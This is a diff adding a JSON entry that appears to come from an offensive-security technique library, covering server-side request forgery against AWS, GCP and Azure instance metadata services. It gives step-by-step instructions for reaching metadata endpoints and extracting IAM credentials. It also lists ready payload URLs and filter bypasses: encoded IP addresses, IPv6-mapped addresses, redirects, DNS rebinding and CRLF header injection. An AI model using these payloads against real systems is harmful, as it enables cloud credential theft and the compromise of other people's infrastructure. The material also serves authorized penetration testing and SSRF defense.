@@ -1,0 +1,67 @@
+{
+  "id": "ssrf-cloud-metadata-imds",
+  "title": "SSRF to Cloud Metadata Service (IMDS v1/v2)",
+  "category": "ssrf",
+  "tags": ["cloud", "aws", "gcp", "azure", "metadata", "imds", "credentials"],
+  "applicability": {
+    "technologies": ["node", "python", "java", "go", "ruby", "php"],
+    "contexts": ["url-parameter", "webhook-url", "api-endpoint", "pdf-generator"],
+    "preconditions": ["server-side-request", "cloud-hosted"]
+  },
+  "technique": {
+    "summary": "Exploit SSRF to reach cloud instance metadata services and extract IAM credentials, API tokens, and infrastructure configuration. IMDS v1 is trivially exploitable; IMDS v2 requires an additional PUT request to obtain a token.",
+    "steps": [
+      "Confirm SSRF exists by requesting an attacker-controlled callback server",
+      "Attempt AWS IMDS v1: GET http://169.254.169.254/latest/meta-data/",
+      "If IMDS v1 blocked, attempt IMDS v2: first PUT to get token, then GET with token header",
+      "For GCP: GET http://metadata.google.internal/computeMetadata/v1/ with Metadata-Flavor: Google header",
+      "For Azure: GET http://169.254.169.254/metadata/instance?api-version=2021-02-01 with Metadata: true header",
+      "Extract IAM role credentials from /latest/meta-data/iam/security-credentials/<role>",
+      "Use extracted credentials to access other cloud services (S3, EC2, etc.)"
+    ],
+    "payloads": [
+      {
+        "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "AWS IMDS v1 — lists available IAM roles"
+      },
+      {
+        "payload": "http://169.254.169.254/latest/user-data",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "AWS — may contain startup scripts with hardcoded secrets"
+      },
+      {
+        "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "GCP — requires Metadata-Flavor: Google header (may need header injection)"
+      },
+      {
+        "payload": "http://[::ffff:169.254.169.254]/latest/meta-data/",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "IPv6 mapped address bypass"
+      },
+      {
+        "payload": "http://0xA9FEA9FE/latest/meta-data/",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "Hex IP encoding bypass for 169.254.169.254"
+      }
+    ],
+    "bypassTechniques": [
+      "Use hex/octal/decimal IP encoding: 0xA9FEA9FE, 2852039166, 0251.0376.0251.0376",
+      "IPv6 mapped address: [::ffff:169.254.169.254]",
+      "URL redirect: host a page that 302-redirects to metadata endpoint",
+      "DNS rebinding with metadata IP",
+      "For IMDSv2: chain with header injection (CRLF) to inject PUT + token header"
+    ]
+  },
+  "references": [
+    "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html",
+    "https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-ec2-instance-metadata"
+  ],
+  "source": "manual"
+}
